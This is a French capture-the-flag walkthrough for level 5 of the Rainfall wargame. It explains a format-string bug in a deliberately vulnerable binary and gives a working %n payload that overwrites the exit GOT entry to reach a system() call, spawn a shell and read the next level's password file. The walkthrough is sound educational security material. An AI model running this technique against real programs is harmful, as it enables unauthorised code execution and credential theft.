---

# Rainfall — Level 5

## Objectif

Analyser et exploiter le binaire `level5` afin d’obtenir l’exécution de code avec les privilèges du niveau suivant, puis récupérer le mot de passe de `level6`.

---

## 1. Analyse initiale

### 1.1. Fonction `main`

Le point d’entrée appelle uniquement `n`, puis termine :

```bash
(gdb) disas main
```

```asm
0x0804850a <+6>:  call   0x80484c2 <n>
```

Conclusion : toute la logique exploitable se trouve dans `n`.

---

### 1.2. Fonction `n` : lecture utilisateur + `printf` vulnérable

```bash
(gdb) disas n
```

```asm
0x080484e5 <+35>: call   0x80483a0 <fgets@plt>
0x080484f3 <+49>: call   0x8048380 <printf@plt>
0x080484ff <+61>: call   0x80483d0 <exit@plt>
```

Points clés :

* `fgets` lit jusqu’à `0x200` octets dans un buffer local (stack).

* Le contenu du buffer est passé **directement** à `printf` :

  ```c
  printf(buffer);
  ```

* Cela introduit une **faille de format string** : l’entrée utilisateur est interprétée comme un format (`%x`, `%n`, etc.).

* La fonction se termine par `exit@plt`, ce qui fournit une cible naturelle pour un détournement du flot.

---

## 2. Identification des primitives utiles

### 2.1. Présence d’une fonction intéressante : `o`

Le binaire contient une fonction `o` jamais appelée dans le flot normal, mais exécutant `system()` :

```bash
(gdb) disas o
```

```asm
0x080484a4 <+0>:  push   %ebp
...
0x080484b1 <+13>: call   0x80483b0 <system@plt>
...
```

Adresse de début de `o` : **`0x080484a4`**.

Objectif : forcer un saut vers `o` afin d’obtenir l’exécution du `system()`.

---

### 2.2. Où intervenir : `exit@plt` et la GOT

L’appel à `exit` se fait via le PLT. Pour identifier l’entrée GOT utilisée, le stub PLT est désassemblé :

```bash
(gdb) disas exit
```

```asm
0x080483d0 <+0>: jmp    *0x8049838
```

Interprétation :

* `exit@plt` effectue un saut indirect vers l’adresse stockée à **`0x8049838`**.
* `0x8049838` est l’entrée **GOT** associée à `exit`.
* Si la valeur à cette adresse est remplacée par `0x080484a4`, alors `exit()` redirigera vers `o()`.

Objectif concret :

```
*(0x8049838) = 0x080484a4
```

---

## 3. Exploitation de la faille format string

### 3.1. Recherche de l’offset d’argument (position sur la stack)

`printf` va chercher ses “arguments” sur la stack. Comme aucun argument supplémentaire n’est fourni, `printf` va lire ce qui se trouve déjà sur la stack (dont le buffer).

Pour retrouver la position où apparaît le buffer, un marqueur est injecté (`AAAA`) :

```bash
python -c 'print("AAAA %x. %x. %x. %x. %x. %x.")' | ./level5
```

Sortie observée :

```
AAAA 200. b7fd1ac0. b7ff37d0. 41414141. 2e782520. 2e782520.
```

`0x41414141` (AAAA) apparaît au **4ᵉ** `%x`.

Conclusion :

* le début du buffer correspond à l’argument **`%4$...`**
* une écriture via `%4$n` ciblera l’adresse placée en tête de payload.

---

### 3.2. Principe d’écriture avec `%n`

* `%n` écrit en mémoire **le nombre de caractères imprimés** par `printf` jusqu’à cet instant.
* En plaçant une adresse au début de l’entrée, puis en imprimant un padding contrôlé, `%n` permet d’écrire une valeur choisie à une adresse choisie.

Ici :

* adresse à modifier : **GOT(exit) = `0x8049838`**
* valeur à écrire : **adresse de `o` = `0x080484a4`**

---

### 3.3. Calcul de la valeur à imprimer

Adresse cible :

```
o = 0x080484a4
```

Conversion hexadécimal → décimal :

```
0x080484a4 = 134513828
```

Important : l’adresse GOT est placée au début du payload sous forme de 4 octets :

```
"\x38\x98\x04\x08"
```

Ces 4 octets font partie des caractères déjà “émis” par `printf` avant le padding. Donc la largeur à atteindre doit être :

```
134513828 - 4 = 134513824
```

---

## 4. Payload final

Construction :

* début : adresse GOT de `exit` en little-endian
* padding : atteindre 134513824 caractères imprimés
* écriture : `%4$n`

Commande finale :

```bash
(python -c 'print("\x38\x98\x04\x08" + "%134513824d%4$n")'; cat) | ./level5
```

Effet attendu :

* écrasement de `*(0x8049838)` par `0x080484a4`
* lors de `exit()`, saut vers `o()`
* exécution de `system(...)`

---

## 5. Vérifications et récupération du flag

Une fois le shell obtenu, vérification de l’identité :

```bash
whoami
```

Puis récupération du mot de passe du niveau suivant :

```bash
cat /home/user/level6/.pass
```

---

## Résumé

* `n` lit une entrée utilisateur et appelle `printf(buffer)` → faille format string.
* `n` termine par `exit@plt`.
* `exit@plt` saute via `jmp *0x8049838` → entrée GOT modifiable.
* `o` contient un `system()` et n’est pas appelée normalement.
* `0x8049838` (GOT exit) est écrasée avec `0x080484a4` (adresse de `o`) via `%4$n`.
* Le détournement transforme l’appel à `exit()` en appel à `o()`, ce qui mène au shell et au flag.

---
